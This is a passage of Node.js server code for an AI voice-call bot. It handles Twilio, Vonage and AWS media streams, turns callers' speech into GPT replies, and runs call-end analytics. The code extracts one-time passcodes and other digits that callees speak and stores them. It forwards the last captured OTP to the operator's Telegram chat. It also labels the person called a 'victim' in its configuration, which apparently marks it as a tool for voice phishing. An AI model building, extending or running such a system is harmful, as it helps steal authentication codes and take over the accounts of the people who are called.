        (isDigitIntent || captureActive) &&
        otpContext.codes &&
        otpContext.codes.length &&
        digitService?.hasExpectation(callSid)
      ) {
        const activeExpectation = digitService.getExpectation(callSid);
        const progress = digitService.formatOtpForDisplay(
          otpContext.codes[otpContext.codes.length - 1],
          "progress",
          activeExpectation?.max_digits,
        );
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
        const collection = digitService.recordDigits(
          callSid,
          otpContext.codes[otpContext.codes.length - 1],
          {
            timestamp: Date.now(),
            source: "spoken",
            full_input: true,
            attempt_id: activeExpectation?.attempt_id || null,
            plan_id: activeExpectation?.plan_id || null,
            plan_step_index: activeExpectation?.plan_step_index || null,
          },
        );
        await digitService.handleCollectionResult(
          callSid,
          collection,
          gptService,
          interactionCount,
          "spoken",
          { allowCallEnd: true },
        );
      }
      if (captureActive) {
        return;
      }

      if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }

      if (
        shouldCloseConversation(otpContext.maskedForGpt) &&
        interactionCount >= 1
      ) {
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.user_goodbye,
          "user_goodbye",
        );
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }

      const getInteractionCount = () => interactionCount;
      const setInteractionCount = (nextCount) => {
        interactionCount = nextCount;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = nextCount;
        }
      };
      if (isDigitIntent) {
        await enqueueGptTask(callSid, async () => {
          const currentCount = interactionCount;
          try {
            await gptService.completion(otpContext.maskedForGpt, currentCount);
          } catch (gptError) {
            console.error("GPT completion error:", gptError);
            webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
              force: true,
            });
          }
          setInteractionCount(currentCount + 1);
        });
        return;
      }
      await processNormalFlowTranscript(
        callSid,
        otpContext.maskedForGpt,
        gptService,
        getInteractionCount,
        setInteractionCount,
      );
    });

    ttsService.on("speech", (responseIndex, audio, label, icount) => {
      const level = estimateAudioLevelFromBase64(audio);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", { level })
        .catch(() => {});
      if (digitService?.hasExpectation(callSid)) {
        digitService.updatePromptDelay(
          callSid,
          estimateAudioDurationMsFromBase64(audio),
        );
      }
      if (callSid) {
        db.updateCallState(callSid, "tts_ready", {
          response_index: responseIndex,
          interaction_count: icount,
          audio_bytes: audio?.length || null,
        }).catch(() => {});
      }
      streamService.buffer(responseIndex, audio);
    });

    streamService.on("audiosent", (markLabel) => {
      marks.push(markLabel);
    });
    streamService.on("audiotick", (tick) => {
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", {
          level: tick?.level,
          logEvent: false,
        })
        .catch(() => {});
    });

    ws.on("close", () => {
      console.log(
        `WebSocket connection closed for adaptive call: ${callSid || "unknown"}`,
      );
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      clearSpeechTicks(callSid);
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
      streamStartTimes.delete(callSid);
      sttFailureCounts.delete(callSid);
      if (callSid && activeStreamConnections.get(callSid)?.ws === ws) {
        activeStreamConnections.delete(callSid);
      }
      if (callSid) {
        if (pendingStreams.has(callSid)) {
          clearTimeout(pendingStreams.get(callSid));
          pendingStreams.delete(callSid);
        }
        streamStartSeen.delete(callSid);
        streamAuthBypass.delete(callSid);
        streamRetryState.delete(callSid);
        purgeStreamStatusDedupe(callSid);
        streamLastMediaAt.delete(callSid);
        sttLastFrameAt.delete(callSid);
        streamWatchdogState.delete(callSid);
        if (streamSid) {
          streamStopSeen.delete(`${callSid}:${streamSid}`);
        }
      }
    });
  } catch (err) {
    console.error("WebSocket handler error:", err);
  }
});

// Vonage websocket media handler (bidirectional PCM µ-law)
app.ws("/vonage/stream", async (ws, req) => {
  try {
    const callSid = req.query?.callSid;
    if (!callSid) {
      ws.close();
      return;
    }

    let interactionCount = 0;
    const callConfig = callConfigurations.get(callSid);
    const functionSystem = callFunctionSystems.get(callSid);
    if (!callConfig) {
      ws.close();
      return;
    }

    const ttsService = new TextToSpeechService();
    ttsService
      .generate(
        { partialResponseIndex: null, partialResponse: "warming up" },
        -1,
        { silent: true },
      )
      .catch(() => {});
    const transcriptionService = new TranscriptionService({
      encoding: "mulaw",
      sampleRate: 8000,
    });

    const handleSttFailure = async (tag, error) => {
      if (!callSid) return;
      console.error(
        `STT failure (${tag}) for ${callSid}`,
        error?.message || error || "",
      );
      const session = activeCalls.get(callSid);
      await activateDtmfFallback(
        callSid,
        callConfig,
        gptService,
        session?.interactionCount || interactionCount,
        tag,
      );
    };

    transcriptionService.on("error", (error) => {
      handleSttFailure("stt_error", error);
    });
    transcriptionService.on("close", () => {
      handleSttFailure("stt_closed");
    });

    let gptService;
    if (functionSystem) {
      gptService = new EnhancedGptService(
        callConfig?.prompt,
        callConfig?.first_message,
      );
    } else {
      gptService = new EnhancedGptService(
        callConfig?.prompt,
        callConfig?.first_message,
      );
    }

    gptService.setCallSid(callSid);
    gptService.setCustomerName(
      callConfig?.customer_name || callConfig?.victim_name,
    );
    gptService.setCallProfile(
      callConfig?.purpose || callConfig?.business_context?.purpose,
    );
    const intentLine = `Call intent: ${callConfig?.script || "general"} | purpose: ${callConfig?.purpose || "general"} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || "unspecified"}. Keep replies concise and on-task.`;
    gptService.setCallIntent(intentLine);
    await applyInitialDigitIntent(callSid, callConfig, gptService, 0);
    configureCallTools(gptService, callSid, callConfig, functionSystem);

    activeCalls.set(callSid, {
      startTime: new Date(),
      transcripts: [],
      gptService,
      callConfig,
      functionSystem,
      personalityChanges: [],
      ws,
      ttsService,
      interactionCount: 0,
    });

    gptService.on("gptreply", async (gptReply, icount) => {
      gptErrorCount = 0;
      const activeSession = activeCalls.get(callSid);
      if (activeSession?.ending) {
        return;
      }
      webhookService.recordTranscriptTurn(
        callSid,
        "agent",
        gptReply.partialResponse,
      );
      webhookService
        .setLiveCallPhase(callSid, "agent_responding")
        .catch(() => {});
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "ai",
          message: gptReply.partialResponse,
          interaction_count: icount,
          personality_used: gptReply.personalityInfo?.name || "default",
          adaptation_data: JSON.stringify(gptReply.adaptationHistory || []),
        });
        await db.updateCallState(callSid, "ai_responded", {
          message: gptReply.partialResponse,
          interaction_count: icount,
        });
      } catch (dbError) {
        console.error("Database error adding AI transcript:", dbError);
      }

      await ttsService.generate(gptReply, icount);
      scheduleSilenceTimer(callSid);
    });

    gptService.on("stall", (fillerText) => {
      webhookService.addLiveEvent(callSid, "⏳ One moment…", { force: true });
      try {
        ttsService.generate(
          {
            partialResponse: fillerText,
            personalityInfo: { name: "filler" },
            adaptationHistory: [],
          },
          interactionCount,
        );
      } catch (err) {
        console.error("Filler TTS error:", err);
      }
    });

    gptService.on("gpterror", async (err) => {
      gptErrorCount += 1;
      const message = err?.message || "GPT error";
      webhookService.addLiveEvent(callSid, `⚠️ GPT error: ${message}`, {
        force: true,
      });
      if (gptErrorCount >= 2) {
        await speakAndEndCall(callSid, CALL_END_MESSAGES.error, "gpt_error");
      }
    });

    ttsService.on("speech", (responseIndex, audio) => {
      const level = estimateAudioLevelFromBase64(audio);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", { level })
        .catch(() => {});
      scheduleSpeechTicksFromAudio(callSid, "agent_speaking", audio);
      if (digitService?.hasExpectation(callSid)) {
        digitService.updatePromptDelay(
          callSid,
          estimateAudioDurationMsFromBase64(audio),
        );
      }
      if (callSid) {
        db.updateCallState(callSid, "tts_ready", {
          response_index: responseIndex,
          interaction_count: interactionCount,
          audio_bytes: audio?.length || null,
          provider: "vonage",
        }).catch(() => {});
      }
      try {
        const buffer = Buffer.from(audio, "base64");
        ws.send(buffer);
      } catch (error) {
        console.error("Vonage websocket send error:", error);
      }
    });

    transcriptionService.on("utterance", (text) => {
      clearSilenceTimer(callSid);
      if (text && text.trim().length > 0) {
        webhookService
          .setLiveCallPhase(callSid, "user_speaking")
          .catch(() => {});
      }
    });

    transcriptionService.on("transcription", async (text) => {
      if (!text) return;
      clearSilenceTimer(callSid);
      const callConfig = callConfigurations.get(callSid);
      const isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
      const captureActive = isCaptureActiveConfig(callConfig);
      const otpContext = digitService.getOtpContext(text, callSid);
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "user",
          message: otpContext.raw,
          interaction_count: interactionCount,
        });
        await db.updateCallState(callSid, "user_spoke", {
          message: otpContext.raw,
          interaction_count: interactionCount,
          otp_detected: otpContext.otpDetected,
          last_collected_code: otpContext.codes?.slice(-1)[0] || null,
          collected_codes: otpContext.codes?.join(", ") || null,
        });
      } catch (dbError) {
        console.error("Database error adding user transcript:", dbError);
      }
      webhookService.recordTranscriptTurn(callSid, "user", otpContext.raw);
      if (
        (isDigitIntent || captureActive) &&
        otpContext.codes &&
        otpContext.codes.length &&
        digitService?.hasExpectation(callSid)
      ) {
        const activeExpectation = digitService.getExpectation(callSid);
        const progress = digitService.formatOtpForDisplay(
          otpContext.codes[otpContext.codes.length - 1],
          "progress",
          activeExpectation?.max_digits,
        );
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
        const collection = digitService.recordDigits(
          callSid,
          otpContext.codes[otpContext.codes.length - 1],
          {
            timestamp: Date.now(),
            source: "spoken",
            full_input: true,
            attempt_id: activeExpectation?.attempt_id || null,
            plan_id: activeExpectation?.plan_id || null,
            plan_step_index: activeExpectation?.plan_step_index || null,
          },
        );
        await digitService.handleCollectionResult(
          callSid,
          collection,
          gptService,
          interactionCount,
          "spoken",
          { allowCallEnd: true },
        );
      }
      if (captureActive) {
        return;
      }
      if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }
      if (
        shouldCloseConversation(otpContext.maskedForGpt) &&
        interactionCount >= 1
      ) {
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.user_goodbye,
          "user_goodbye",
        );
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }
      const getInteractionCount = () => interactionCount;
      const setInteractionCount = (nextCount) => {
        interactionCount = nextCount;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = nextCount;
        }
      };
      if (isDigitIntent) {
        await enqueueGptTask(callSid, async () => {
          const currentCount = interactionCount;
          try {
            await gptService.completion(otpContext.maskedForGpt, currentCount);
          } catch (gptError) {
            console.error("GPT completion error:", gptError);
            webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
              force: true,
            });
          }
          setInteractionCount(currentCount + 1);
        });
        return;
      }
      await processNormalFlowTranscript(
        callSid,
        otpContext.maskedForGpt,
        gptService,
        getInteractionCount,
        setInteractionCount,
      );
    });

    ws.on("message", (data) => {
      if (!data) return;
      if (Buffer.isBuffer(data)) {
        transcriptionService.sendBuffer(data);
        return;
      }
      const str = data.toString();
      try {
        const parsed = JSON.parse(str);
        if (parsed?.event === "websocket:closed") {
          ws.close();
        }
      } catch {
        // ignore non-JSON
      }
    });

    ws.on("close", async () => {
      const session = activeCalls.get(callSid);
      if (session?.startTime) {
        await handleCallEnd(callSid, session.startTime);
      }
      activeCalls.delete(callSid);
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      clearSpeechTicks(callSid);
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
    });

    // Send first message once stream is ready
    const initialExpectation = digitService?.getExpectation(callSid);
    const firstMessage =
      callConfig?.first_message ||
      (initialExpectation
        ? digitService.buildDigitPrompt(initialExpectation)
        : "");
    if (firstMessage) {
      ttsService.generate(
        { partialResponseIndex: null, partialResponse: firstMessage },
        0,
      );
      webhookService.recordTranscriptTurn(callSid, "agent", firstMessage);
      if (digitService?.hasExpectation(callSid)) {
        digitService.markDigitPrompted(callSid, gptService, 0, "dtmf", {
          allowCallEnd: true,
          prompt_text: firstMessage,
        });
        digitService.scheduleDigitTimeout(callSid, gptService, 0);
      }
      scheduleSilenceTimer(callSid);
    }
  } catch (error) {
    console.error("Vonage websocket error:", error);
    ws.close();
  }
});

// AWS websocket media handler (external audio forwarder -> Deepgram -> GPT -> Polly)
app.ws("/aws/stream", (ws, req) => {
  try {
    const callSid = req.query?.callSid;
    const contactId = req.query?.contactId;
    if (!callSid || !contactId) {
      ws.close();
      return;
    }

    const callConfig = callConfigurations.get(callSid);
    const resolvedVoiceModel = resolveVoiceModel(callConfig);
    if (resolvedVoiceModel) {
      ttsService.voiceModel = resolvedVoiceModel;
    }
    if (!callConfig) {
      ws.close();
      return;
    }

    if (!callConfig.provider_metadata) {
      callConfig.provider_metadata = {};
    }
    if (!callConfig.provider_metadata.contact_id) {
      callConfig.provider_metadata.contact_id = contactId;
    }
    awsContactMap.set(contactId, callSid);

    const sampleRate = Number(req.query?.sampleRate) || 16000;
    const encoding = req.query?.encoding || "pcm";

    const transcriptionService = new TranscriptionService({
      encoding: encoding,
      sampleRate: sampleRate,
    });

    const handleSttFailure = async (tag, error) => {
      if (!callSid) return;
      console.error(
        `STT failure (${tag}) for ${callSid}`,
        error?.message || error || "",
      );
      const session = activeCalls.get(callSid);
      await activateDtmfFallback(
        callSid,
        session?.callConfig || callConfig,
        session?.gptService,
        session?.interactionCount || interactionCount,
        tag,
      );
    };

    transcriptionService.on("error", (error) => {
      handleSttFailure("stt_error", error);
    });
    transcriptionService.on("close", () => {
      handleSttFailure("stt_closed");
    });

    const sessionPromise = ensureAwsSession(callSid);
    let interactionCount = 0;

    transcriptionService.on("utterance", (text) => {
      clearSilenceTimer(callSid);
      if (text && text.trim().length > 0) {
        webhookService
          .setLiveCallPhase(callSid, "user_speaking")
          .catch(() => {});
      }
    });

    transcriptionService.on("transcription", async (text) => {
      if (!text) return;
      clearSilenceTimer(callSid);
      const session = await sessionPromise;
      const isDigitIntent = session?.callConfig?.digit_intent?.mode === "dtmf";
      const captureActive = isCaptureActiveConfig(session?.callConfig);
      const otpContext = digitService.getOtpContext(text, callSid);
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "user",
          message: otpContext.raw,
          interaction_count: interactionCount,
        });
        await db.updateCallState(callSid, "user_spoke", {
          message: otpContext.raw,
          interaction_count: interactionCount,
          otp_detected: otpContext.otpDetected,
          last_collected_code: otpContext.codes?.slice(-1)[0] || null,
          collected_codes: otpContext.codes?.join(", ") || null,
        });
      } catch (dbError) {
        console.error("Database error adding user transcript:", dbError);
      }

      webhookService.recordTranscriptTurn(callSid, "user", otpContext.raw);
      if (
        (isDigitIntent || captureActive) &&
        otpContext.codes &&
        otpContext.codes.length &&
        digitService?.hasExpectation(callSid)
      ) {
        const activeExpectation = digitService.getExpectation(callSid);
        const progress = digitService.formatOtpForDisplay(
          otpContext.codes[otpContext.codes.length - 1],
          "progress",
          activeExpectation?.max_digits,
        );
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
        const collection = digitService.recordDigits(
          callSid,
          otpContext.codes[otpContext.codes.length - 1],
          {
            timestamp: Date.now(),
            source: "spoken",
            full_input: true,
            attempt_id: activeExpectation?.attempt_id || null,
            plan_id: activeExpectation?.plan_id || null,
            plan_step_index: activeExpectation?.plan_step_index || null,
          },
        );
        await digitService.handleCollectionResult(
          callSid,
          collection,
          session.gptService,
          interactionCount,
          "spoken",
          { allowCallEnd: true },
        );
      }
      if (captureActive) {
        return;
      }

      if (
        shouldCloseConversation(otpContext.maskedForGpt) &&
        interactionCount >= 1
      ) {
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.user_goodbye,
          "user_goodbye",
        );
        interactionCount += 1;
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }

      const getInteractionCount = () => interactionCount;
      const setInteractionCount = (nextCount) => {
        interactionCount = nextCount;
        if (session) {
          session.interactionCount = nextCount;
        }
      };
      if (isDigitIntent) {
        await enqueueGptTask(callSid, async () => {
          const currentCount = interactionCount;
          try {
            await session.gptService.completion(
              otpContext.maskedForGpt,
              currentCount,
            );
          } catch (gptError) {
            console.error("GPT completion error:", gptError);
            webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
              force: true,
            });
          }
          setInteractionCount(currentCount + 1);
        });
        return;
      }
      await processNormalFlowTranscript(
        callSid,
        otpContext.maskedForGpt,
        session.gptService,
        getInteractionCount,
        setInteractionCount,
      );
    });

    ws.on("message", (data) => {
      if (!data) return;
      if (Buffer.isBuffer(data)) {
        transcriptionService.sendBuffer(data);
        return;
      }
      const str = data.toString();
      try {
        const payload = JSON.parse(str);
        if (payload?.audio) {
          transcriptionService.send(payload.audio);
        }
      } catch {
        // ignore non-JSON text frames
      }
    });

    ws.on("close", async () => {
      const session = activeCalls.get(callSid);
      if (session?.startTime) {
        await handleCallEnd(callSid, session.startTime);
      }
      activeCalls.delete(callSid);
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
    });

    recordCallStatus(callSid, "in-progress", "call_in_progress").catch(
      () => {},
    );
  } catch (error) {
    console.error("AWS websocket error:", error);
    ws.close();
  }
});

// Enhanced call end handler with adaptation analytics
async function handleCallEnd(callSid, callStartTime) {
  try {
    const callEndTime = new Date();
    const duration = Math.round((callEndTime - callStartTime) / 1000);
    for (const key of gatherEventDedupe.keys()) {
      if (key.startsWith(`${callSid}:`)) {
        gatherEventDedupe.delete(key);
      }
    }
    clearGptQueue(callSid);
    clearNormalFlowState(callSid);
    clearSpeechTicks(callSid);
    sttFallbackCalls.delete(callSid);
    streamTimeoutCalls.delete(callSid);
    clearFirstMediaWatchdog(callSid);
    streamFirstMediaSeen.delete(callSid);
    streamLastMediaAt.delete(callSid);
    sttLastFrameAt.delete(callSid);
    streamWatchdogState.delete(callSid);
    streamStartSeen.delete(callSid);
    streamAuthBypass.delete(callSid);
    streamRetryState.delete(callSid);
    purgeStreamStatusDedupe(callSid);
    purgeCallStatusDedupe(callSid);
    callLifecycle.delete(callSid);
    const lifecycleTimer = callLifecycleCleanupTimers.get(callSid);
    if (lifecycleTimer) {
      clearTimeout(lifecycleTimer);
      callLifecycleCleanupTimers.delete(callSid);
    }
    const terminalStatuses = new Set([
      "completed",
      "no-answer",
      "no_answer",
      "busy",
      "failed",
      "canceled",
    ]);
    const normalizeStatus = (value) =>
      String(value || "")
        .toLowerCase()
        .replace(/_/g, "-");
    const initialCallDetails = await db.getCall(callSid);
    const persistedStatus = normalizeStatus(
      initialCallDetails?.status || initialCallDetails?.twilio_status,
    );
    const finalStatus = terminalStatuses.has(persistedStatus)
      ? persistedStatus
      : "completed";
    const notificationMap = {
      completed: "call_completed",
      "no-answer": "call_no_answer",
      busy: "call_busy",
      failed: "call_failed",
      canceled: "call_canceled",
    };
    const notificationType = notificationMap[finalStatus] || "call_completed";
    if (digitService) {
      digitService.clearCallState(callSid);
    }
    clearCallEndLock(callSid);
    clearSilenceTimer(callSid);

    const transcripts = (await db.getCallTranscripts(callSid)) || [];
    const summary = generateCallSummary(transcripts, duration);
    const digitEvents = await db.getCallDigits(callSid).catch(() => []);
    const digitSummary = buildDigitSummary(digitEvents);
    const digitFunnel = buildDigitFunnelStats(digitEvents);

    // Get personality adaptation data
    const callSession = activeCalls.get(callSid);
    let adaptationAnalysis = {};

    if (callSession && callSession.gptService) {
      const conversationAnalysis =
        callSession.gptService.getConversationAnalysis();
      adaptationAnalysis = {
        personalityChanges: conversationAnalysis.personalityChanges,
        finalPersonality: conversationAnalysis.currentPersonality,
        adaptationEffectiveness:
          conversationAnalysis.personalityChanges /
          Math.max(conversationAnalysis.totalInteractions / 10, 1),
        businessContext: callSession.functionSystem?.context || {},
      };
    }

    await db.updateCallStatus(callSid, finalStatus, {
      ended_at: callEndTime.toISOString(),
      duration: duration,
      call_summary: summary.summary,
      ai_analysis: JSON.stringify({
        ...summary.analysis,
        adaptation: adaptationAnalysis,
      }),
      digit_summary: digitSummary.summary,
      digit_count: digitSummary.count,
    });

    await db.updateCallState(callSid, "call_ended", {
      end_time: callEndTime.toISOString(),
      duration: duration,
      total_interactions: transcripts.length,
      personality_adaptations: adaptationAnalysis.personalityChanges || 0,
    });
    if (digitFunnel) {
      await db
        .updateCallState(callSid, "digit_funnel_summary", digitFunnel)
        .catch(() => {});
    }

    const callDetails = await db.getCall(callSid);

    // Create enhanced webhook notification for completion
    if (callDetails && callDetails.user_chat_id) {
      if (callDetails.last_otp) {
        const masked = digitService
          ? digitService.formatOtpForDisplay(callDetails.last_otp, "masked")
          : callDetails.last_otp;
        const otpMsg = `🔐 ${masked} (call ${callSid.slice(-6)})`;
        try {
          await webhookService.sendTelegramMessage(
            callDetails.user_chat_id,
            otpMsg,
          );
        } catch (err) {
          console.error("Error sending OTP to user:", err);
        }
      }

      if (digitEvents && digitEvents.length) {
        const lines = digitEvents
          .filter((d) => d.digits)
          .map((d) => {
            const label = DIGIT_PROFILE_LABELS[d.profile] || d.profile;
            const display = digitService
              ? digitService.formatDigitsGeneral(d.digits, null, "notify")
              : d.digits;
            const src = d.source || "unknown";
            return `• ${label} [${src}]: ${display}`;
          });
        // Suppressed verbose digit timeline to avoid leaking sensitive digits in notifications
      }
      await db.createEnhancedWebhookNotification(
        callSid,
        notificationType,
        callDetails.user_chat_id,
      );

      // Schedule transcript notification with delay
      if (finalStatus === "completed") {
        setTimeout(async () => {
          try {
            await db.createEnhancedWebhookNotification(
              callSid,
              "call_transcript",
              callDetails.user_chat_id,
            );
          } catch (transcriptError) {
            console.error(
              "Error creating transcript notification:",
              transcriptError,
            );
          }
        }, 2000);
      }
    }

    const inboundConfig = callConfigurations.get(callSid);
    if (inboundConfig?.inbound && callDetails?.user_chat_id) {
      const normalizedStatus = normalizeCallStatus(
        callDetails.status || callDetails.twilio_status || finalStatus,
      );
      webhookService
        .sendCallStatusUpdate(
          callSid,
          normalizedStatus,
          callDetails.user_chat_id,
          {
            duration,
            ring_duration: callDetails.ring_duration,
            answered_by: callDetails.answered_by,
            status_source: "stream",
          },
        )
        .catch((err) => console.error("Inbound terminal update error:", err));
    }

    console.log(`Enhanced adaptive call ${callSid} ended (${finalStatus})`);
    console.log(
      `Duration: ${duration}s | Messages: ${transcripts.length} | Adaptations: ${adaptationAnalysis.personalityChanges || 0}`,
    );
    if (adaptationAnalysis.finalPersonality) {
      console.log(`Final personality: ${adaptationAnalysis.finalPersonality}`);
    }

    // Log service health
    await db.logServiceHealth("call_system", `call_${finalStatus}`, {
      call_sid: callSid,
      duration: duration,
      interactions: transcripts.length,
      adaptations: adaptationAnalysis.personalityChanges || 0,
    });
  } catch (error) {
    console.error("Error handling enhanced adaptive call end:", error);

    // Log error to service health
    try {
      await db.logServiceHealth("call_system", "error", {
        operation: "handle_call_end",
        call_sid: callSid,
        error: error.message,
      });
    } catch (logError) {
      console.error("Failed to log service health error:", logError);
    }
  }
}

function generateCallSummary(transcripts, duration) {
  if (!transcripts || transcripts.length === 0) {
    return {
      summary: "No conversation recorded",
      analysis: { total_messages: 0, user_messages: 0, ai_messages: 0 },
    };
  }

  const userMessages = transcripts.filter((t) => t.speaker === "user");
  const aiMessages = transcripts.filter((t) => t.speaker === "ai");

  const analysis = {
    total_messages: transcripts.length,
    user_messages: userMessages.length,
    ai_messages: aiMessages.length,
    duration_seconds: duration,
    conversation_turns: Math.max(userMessages.length, aiMessages.length),
  };

  const summary =
    `Enhanced adaptive call completed with ${transcripts.length} messages over ${Math.round(duration / 60)} minutes. ` +
    `User spoke ${userMessages.length} times, AI responded ${aiMessages.length} times.`;

  return { summary, analysis };
}

async function handleTwilioIncoming(req, res) {
  try {
    if (!requireValidTwilioSignature(req, res, "/incoming")) {
      return;
    }
    const host = resolveHost(req);
    if (!host) {
      return res.status(500).send("Server hostname not configured");
    }
    const maskedFrom = maskPhoneForLog(req.body?.From);
    const maskedTo = maskPhoneForLog(req.body?.To);
    console.log(
      `Incoming call webhook (${req.method}) from ${maskedFrom} to ${maskedTo} host=${host}`,
    );
    const callSid = req.body?.CallSid;
    const directionRaw = req.body?.Direction || req.body?.direction;
    const isOutbound = isOutboundTwilioDirection(directionRaw);
    const directionLabel = isOutbound ? "outbound" : "inbound";
    if (callSid) {
      callDirections.set(callSid, directionLabel);
      if (!isOutbound) {
        await refreshInboundDefaultScript();
        const callRecord = await ensureCallRecord(
          callSid,
          req.body,
          "incoming_webhook",
        );
        const chatId = callRecord?.user_chat_id || config.telegram?.adminChatId;
        const callerLookup = callRecord?.phone_number
          ? normalizePhoneForFlag(callRecord.phone_number) ||
            callRecord.phone_number
          : null;
        const callerFlag = callerLookup
          ? await db.getCallerFlag(callerLookup).catch(() => null)
          : null;
        if (callerFlag?.status !== "allowed") {
          const rateLimit = shouldRateLimitInbound(req, req.body || {});
          if (rateLimit.limited) {
            await db
              .updateCallState(callSid, "inbound_rate_limited", {
                at: new Date().toISOString(),
                key: rateLimit.key,
                count: rateLimit.count,
                reset_at: rateLimit.resetAt,
              })
              .catch(() => {});
            if (chatId) {
              webhookService
                .sendCallStatusUpdate(callSid, "failed", chatId, {
                  status_source: "rate_limit",
                })
                .catch((err) =>
                  console.error("Inbound rate limit update error:", err),
                );
              webhookService.addLiveEvent(
                callSid,
                "⛔ Inbound rate limit reached",
                { force: true },
              );
            }
            if (
              config.inbound?.rateLimitSmsEnabled &&
              callRecord?.phone_number
            ) {
              try {
                const smsBody = buildInboundSmsBody(
                  callRecord,
                  await db
                    .getLatestCallState(callSid, "call_created")
                    .catch(() => null),
                );
                await smsService.sendSMS(callRecord.phone_number, smsBody);
                await db
                  .updateCallState(callSid, "rate_limit_sms_sent", {
                    at: new Date().toISOString(),
                  })
                  .catch(() => {});
              } catch (smsError) {
                console.error("Failed to send rate-limit SMS:", smsError);
              }
            }
            if (
              config.inbound?.rateLimitCallbackEnabled &&
              callRecord?.phone_number
            ) {
              try {
                const callState = await db
                  .getLatestCallState(callSid, "call_created")
                  .catch(() => null);
                const payload = buildCallbackPayload(callRecord, callState);
                const delayMin = Math.max(
                  1,
                  Number(config.inbound?.callbackDelayMinutes) || 15,
                );
                const runAt = new Date(
                  Date.now() + delayMin * 60 * 1000,
                ).toISOString();
                await scheduleCallJob("callback_call", payload, runAt);
                await db
                  .updateCallState(callSid, "callback_scheduled", {
                    at: new Date().toISOString(),
                    run_at: runAt,
                  })
                  .catch(() => {});
              } catch (callbackError) {
                console.error("Failed to schedule callback:", callbackError);
              }
            }
            const limitedResponse = new VoiceResponse();
            limitedResponse.say(
              "We are experiencing high call volume. Please try again later.",
            );
            limitedResponse.hangup();
            res.type("text/xml");
            res.end(limitedResponse.toString());
            return;
          }
        }
        if (callerFlag?.status === "blocked") {
          if (chatId) {
            webhookService
              .sendCallStatusUpdate(callSid, "failed", chatId, {
                status_source: "blocked",
              })
              .catch((err) =>
                console.error("Blocked caller update error:", err),
              );
          }
          await db
            .updateCallState(callSid, "caller_blocked", {
              at: new Date().toISOString(),
              phone_number: callerLookup || callRecord?.phone_number || null,
              status: callerFlag.status,
              note: callerFlag.note || null,
            })
            .catch(() => {});
          const blockedResponse = new VoiceResponse();
          blockedResponse.say("We cannot take your call at this time.");
          blockedResponse.hangup();
          res.type("text/xml");
          res.end(blockedResponse.toString());
          return;
        }
        if (chatId) {
          webhookService
            .sendCallStatusUpdate(callSid, "ringing", chatId, {
              status_source: "inbound",
            })
            .catch((err) =>
              console.error("Inbound ringing update error:", err),
            );
        }

        const gateStatus =
          webhookService.getInboundGate?.(callSid)?.status || "pending";
        const answerOverride = ["1", "true", "yes"].includes(
          String(req.query?.answer || "").toLowerCase(),
        );
        if (gateStatus === "declined") {
          const declinedResponse = new VoiceResponse();
          declinedResponse.hangup();
          res.type("text/xml");
          res.end(declinedResponse.toString());
          return;
        }
        if (!answerOverride && gateStatus !== "answered") {
          const holdTwiml = buildInboundHoldTwiml(host);
          res.type("text/xml");
          res.end(holdTwiml);
          return;
        }
      }
      const timeoutMs = 30000;
      const timeout = setTimeout(async () => {
        pendingStreams.delete(callSid);
        if (activeCalls.has(callSid)) {
          return;
        }
        let statusValue = "unknown";
        try {
          const callDetails = await db?.getCall?.(callSid);
          statusValue = normalizeCallStatus(
            callDetails?.status || callDetails?.twilio_status,
          );
          if (
            !callDetails?.started_at &&
            !["answered", "in-progress", "completed"].includes(statusValue)
          ) {
            console.warn(
              `Stream not established for ${callSid} yet (status=${statusValue || "unknown"}).`,
            );
            return;
          }
        } catch (err) {
          console.warn(
            `Stream status check failed for ${callSid}: ${err?.message || err}`,
          );
        }
        console.warn(
          `Stream not established for ${callSid} after ${timeoutMs}ms (status=${statusValue || "unknown"}).`,
        );
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Stream not connected yet. Attempting recovery…",
          { force: true },
        );
        void handleStreamTimeout(callSid, host, {
          allowHangup: false,
          reason: "stream_not_connected",
        });
      }, timeoutMs);
      pendingStreams.set(callSid, timeout);
    }
    const response = new VoiceResponse();
    if (!isOutbound) {
      const preconnectMessage = String(
        config.inbound?.preConnectMessage || "",
      ).trim();
      const pauseSeconds = Math.max(
        0,
        Math.min(
